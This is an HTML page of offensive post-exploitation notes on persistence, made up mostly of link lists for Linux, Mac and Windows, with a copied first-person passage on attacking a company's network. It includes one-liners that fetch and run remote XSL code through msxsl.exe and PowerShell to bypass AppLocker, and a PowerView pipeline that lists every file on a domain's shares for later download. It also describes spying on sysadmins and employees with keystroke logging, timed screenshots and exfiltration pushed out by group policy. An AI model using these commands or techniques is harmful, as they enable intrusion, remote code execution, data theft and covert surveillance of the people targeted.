<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Post Exploitation Persistence</title>
</head><body>Note: Most of the enumeration scripts will do post exploitation gathering too if run as Administrator/root!<br/>
<br/>
Linux<br/>
<br/>
Mac <br/>
<a href="https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf">Methods Of Malware Persistence On Mac OS X</a><br/>
&nbsp;<br/>
Windows<br/>
[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/<br/>
[3] http://www.hexacorn.com/blog/category/autostart-persistence/<br/>
[4] https://blog.netspi.com/tag/persistence/<br/>
<br/>
*It is also worth noting that ‘sct’ is not the only player in the game. &nbsp;Here are a few other ‘remote’ XML/XSLT techniques that need to be monitored:<br/>
MsXSL [<a href="https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker">Reference</a>]<br/>
msxsl.exe http://url/file.xml http://url/file.xsl<br/>
System.Xml.Xsl.XslCompiledTransform Assembly via PowerShell [<a href="https://twitter.com/bohops/status/966172175555284992">Reference</a>]<br/>
$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('http://url/file.xsl',$s,$r);$x.Transform('http://url/file.xml','z');del z;<br/>
&nbsp;<br/>
&nbsp;<a href="http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf">http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf</a><br/>
&nbsp;<a href="https://github.com/mubix/post-exploitation/wiki/windows">https://github.com/mubix/post-exploitation/wiki/windows</a><br/>
&nbsp;https://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html <br/>
<br/>
The best tool these days for understanding windows networks is Powerview [1]. It's worth reading everything written by it's author [2], especially [3], [4], [5], and [6]. Powershell itself is also quite powerful [7]. As there are still many windows 2000 and 2003 servers without powershell, you also have to learn the old school [8], with programs like netview.exe [9] or the windows builtin "net view". Other techniques that I like are:<br/>
<br/>
1) Downloading a list of file names<br/>
&nbsp; &nbsp;With a Domain Admin account, you can download a list of all filenames in the network with powerview:<br/>
<br/>
&nbsp; &nbsp;Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |<br/>
&nbsp; &nbsp;select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1] |<br/>
&nbsp; &nbsp;select fullname | out-file -append files.txt}<br/>
<br/>
&nbsp; &nbsp;Later, you can read it at your leisure and choose which files to download.<br/>
<br/>
2) Reading email<br/>
&nbsp; &nbsp;As we've already seen, you can download email with powershell, and it has a lot of useful information.<br/>
<br/>
3) Reading sharepoint<br/>
&nbsp; &nbsp;It's another place where many businesses store a lot of important information. It can also be downloaded with powershell [10].<br/>
<br/>
4) Active Directory [11]<br/>
&nbsp; &nbsp;It has a lot of useful information about users and computers. Without being Domain Admin, you can already get a lot of info with powerview and other tools [12]. After getting Domain Admin, you should export all the AD information with csvde or another tool.<br/>
<br/>
5) Spy on the employees<br/>
&nbsp; &nbsp;One of my favorite hobbies is hunting sysadmins. Spying on Christian Pozzi (one of Hacking Team's sysadmins) gave me access to a Nagios server which gave me access to the rete sviluppo (development network with the source code of RCS). With a simple combination of Get-Keystrokes and Get-TimedScreenshot from PowerSploit [13], Do-Exfiltration from nishang [14], and GPO, you can spy on any employee, or even on the whole domain.<br/>
<br/>
[1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView<br/>
[2] http://www.harmj0y.net/blog/tag/powerview/<br/>
[3] http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/<br/>
[4] http://www.harmj0y.net/blog/redteaming/powerview-2-0/<br/>
[5] http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/<br/>
[6] http://www.slideshare.net/harmj0y/i-have-the-powerview<br/>
[7] https://adsecurity.org/?p=2535<br/>
[8] https://www.youtube.com/watch?v=rpwrKhgMd7E<br/>
[9] https://github.com/mubix/netview<br/>
[10] https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/<br/>
[11] https://adsecurity.org/?page_id=41<br/>
[12] http://www.darkoperator.com/?tag=Active+Directory<br/>
[13] https://github.com/PowerShellMafia/PowerSploit<br/>
[14] https://github.com/samratashok/nishang<br/>
<br/>
<br/>
Complete<br/>
Linux<br/>
<a href="https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List">https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List</a><br/>
http://kaoticcreations.blogspot.cl/2012/07/backdooring-unix-system-via-cron.html<br/>
<br/>
<br/>
Windows<br/>
<a href="https://adsecurity.org/?p=3719 ">https://adsecurity.org/?p=3719 </a><br/>
<a href="http://adsecurity.org/wp-content/uploads/2015/04/NoVaPowerShellUsersGroup2015-ActiveDirectoryPowerShell.pdf">http://adsecurity.org/wp-content/uploads/2015/04/NoVaPowerShellUsersGroup2015-ActiveDirectoryPowerShell.pdf</a>&nbsp;<br/>
<a href="https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/">https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/</a>&nbsp;| ADS<br/>
<a href="https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/">https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/</a>&nbsp;| ADS<br/>
<a href="https://enigma0x3.net/2014/10/14/persistence-using-microsoft-outlook/">https://enigma0x3.net/2014/10/14/persistence-using-microsoft-outlook/</a><br/>
http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/ | In passwords and Hashes section<br/>
<a href="http://www.fuzzysecurity.com/tutorials/19.html">http://www.fuzzysecurity.com/tutorials/19.html</a><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>